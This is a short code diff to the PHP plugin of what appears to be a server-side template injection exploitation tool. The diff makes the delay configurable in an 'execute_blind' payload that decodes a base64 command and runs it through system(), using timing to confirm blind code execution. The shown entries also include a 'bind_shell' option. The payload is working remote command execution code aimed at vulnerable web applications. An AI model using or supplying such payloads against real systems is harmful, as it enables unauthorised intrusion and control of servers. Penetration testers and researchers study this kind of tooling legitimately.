@@ -54,7 +54,7 @@ class Php(Plugin):
         },
         'execute_blind' : {
             'call': 'inject',
-            'execute_blind': """$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)). " && sleep 2");"""
+            'execute_blind': """$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)). " && sleep %(delay)i");"""
         },
         'bind_shell' : {
             'call' : 'execute_blind',
